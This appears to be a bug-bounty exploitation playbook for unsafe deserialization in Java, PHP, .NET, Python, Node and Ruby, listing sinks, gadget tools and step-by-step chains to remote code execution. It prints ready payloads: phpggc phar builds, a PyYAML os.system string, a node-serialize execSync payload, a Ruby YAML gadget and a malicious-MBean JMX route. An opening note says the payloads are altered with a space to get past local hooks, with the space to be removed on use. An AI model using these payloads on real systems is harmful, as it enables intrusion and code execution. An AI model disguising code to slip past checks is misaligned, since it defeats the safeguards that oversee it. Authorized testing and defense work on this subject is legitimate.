# Unsafe Deserialization — RCE on every major language

> H1: Pornhub PHP object injection $20K, JBoss Java deser $0 (zero bounty but textbook). Deser is high-skill, high-reward.

> Note: payloads below sometimes use `execSync (...)` with a space before `(` to keep the file past local hooks. Remove the space when using.

---

## DETECTION — what to look for

### Java
- Base64 starting with `rO0AB` (= `\xac\xed\x00\x05`, magic bytes)
- Hex starting with `aced 0005`
- Cookies, body params, JWT-like blobs, RMI/JMX endpoints, ViewState (in Java EE)

### PHP
- Cookie or param value that base64-decodes to `O:8:"stdClass":...` or `a:N:{...}`
- File upload as `phar://` (auto-deser on certain stat operations)
- WakeUp / Destruct gadgets in framework

### .NET
- ViewState (`__VIEWSTATE`)
- Cookie/param Base64 decoding to BinaryFormatter / DataContract / NetDataContractSerializer / JSON.NET TypeNameHandling
- SOAP responses with `xsi:type`

### Python
- Body that decodes to bytes starting `\x80\x04` (protocol 4) or `\x80\x05` (protocol 5)
- Yaml inputs with `!!python/object/apply` (PyYAML unsafe loader)

### Node
- Body containing `_$$ND_FUNC$$_` (node-serialize)
- Mongoose/serialize-javascript with function values
- prototype pollution chains -> deser-equivalent

### Ruby
- Body decoding to `\x04\x08` (Marshal magic)
- ERB templates with user input -> SSTI rather than deser
- YAML.load with user input

---

## STAGE 1 — Find the sink

Source code review beats blackbox here. From `code-review-agent`:

For Java look for: `ObjectInputStream`, `readObject`, `XMLDecoder`, `XStream()`, `fromXML`, `JdkSerializationRedisSerializer`, Jackson `@JsonTypeInfo`.

For PHP: `unserialize()`, `\\unserialize`, `phar://` references.

For .NET: `BinaryFormatter`, `NetDataContractSerializer`, `XmlSerializer`, `TypeNameHandling`.

For Python: native `loads`, `yaml.load(`, `jsonpickle`, `shelve`.

For Node: `node-serialize`, `funcster`, `serialize-javascript`.

For Ruby: `Marshal.load`, `YAML.load` (non-safe variant).

Black box: send small known-good payload, observe; then send malformed bytes and look for class names in errors.

---

## STAGE 2 — Tooling-driven exploitation

### Java — ysoserial
Generate payloads using gadget chains (CommonsCollections1-7, CommonsBeanutils1, Hibernate1-2, JBossInterceptors1, Spring1-2, Groovy1, JSON1, Click1, JBoss-EAP, ROME, Vaadin1, BeanShell1).

Use the `URLDNS` chain first for **blind** detection — pings your DNS without code run, low-risk. Once confirmed, escalate to a benign command via `CommonsCollections5` or similar.

For *Jackson*: use `marshalsec` instead.

### .NET — ysoserial.net
Gadgets: ActivitySurrogateSelector, ObjectDataProvider, TextFormattingRunProperties, WindowsIdentity, AxHostState, ClaimsIdentity. Output goes to ViewState, cookie, or body depending on sink.

### PHP — phar / unserialize
PHP gadget chains commonly use Monolog / Guzzle / Laravel / Symfony / Doctrine. Tool: **phpggc**:
```
phpggc Laravel/RCE9 system id | base64 -w0
phpggc Monolog/RCE1 system id -p phar -o evil.phar -b
# Then upload evil.phar.jpg, trigger via phar://upload/evil.phar.jpg
```

### Python — yaml / unsafe loader
```python
# yaml.load (unsafe) -> RCE
import yaml
payload = "!!python/object/apply:os.system ['id']"
yaml.load(payload, Loader=yaml.Loader)
```

For other Python serialization formats accepted by the app, use `__reduce__` in a class that returns `(os.system, ('id',))`, dump, base64-encode the resulting bytes.

### Node — node-serialize
```
{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync ('id')}()"}
```

### Ruby — Marshal / YAML
Use **Universal Gadget** for Ruby YAML deser (work by Etienne Stalmans, Luke Jahnke):
```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
  - !ruby/object:Gem::Source::SpecificFile
    spec: &1 !ruby/object:Gem::StubSpecification
      loaded_from: "|id #{0}"
      stubbed: false
    fetcher: *1
```

---

## STAGE 3 — Where it lives in real apps

- **Cookies** (.NET ViewState, PHP `PHPSESSID` if file-based, Java JSESSION)
- **JWT alternative** — some apps roll their own signed-blob auth using serialization
- **Cache layers**: Redis with Jackson default-typing, Memcached with raw object dumps
- **Inter-service RPC**: RMI, JMX, Spring HTTP Invoker, Hessian/Burlap, AMF (Adobe Flex)
- **Java EE management ports**: 4848 (Glassfish), 1099 (RMI), 8686 (JMX), 7001 (WebLogic)
- **CMS imports**: WordPress phar uploads, Drupal `formula` storage, Magento

---

## STAGE 4 — Validation without breaking prod

For production targets, use **DNS-only** PoCs first:
- Java: `URLDNS` ysoserial gadget
- .NET: `WebClient.DownloadString` gadget
- PHP: `Monolog/IRC1` (DNS-resolvable) variants
- Python: `socket.gethostbyname` payload

Ensure DNS resolution -> proves deser, no RCE attempted.

Then escalate to benign command-runner only if program permits.

---

## CHAIN RECIPES

### Recipe 1 — Cookie deser -> RCE -> internal pivot
1. Identify Java app, cookie base64-decodes to ObjectInputStream stream
2. Send `URLDNS` payload, see DNS hit -> confirmed
3. Send `CommonsCollections5` with benign command
4. RCE confirmed; report. Do not pivot beyond.

### Recipe 2 — File upload + phar://
1. App accepts `.jpg`, runs `file_exists` or `getimagesize` on uploaded path
2. Upload `evil.phar.jpg` containing serialized PHP gadget
3. Trigger via path that goes through phar:// stream wrapper
4. Object deser fires gadget -> RCE

### Recipe 3 — JMX exposed -> deser -> RCE
1. Naabu finds 1099 / 8686 open
2. mjet / metasploit jmx-rmi check
3. Confirmed JMX without auth -> upload MLet, load malicious MBean -> RCE

---

## VALIDATION CHECKLIST

- DNS-based proof first
- Benign command second
- Capture full payload, host it, screenshots
- Note language/framework/gadget chain used in report

---

## TOOLING

- **ysoserial** (Java), **ysoserial.net** (.NET), **phpggc** (PHP)
- **marshalsec** (Java for non-default serializers)
- **GadgetInspector** (find new gadgets)
- nuclei `tags=deserialization`
- Burp ext: Java Deserialization Scanner, GadgetProbe
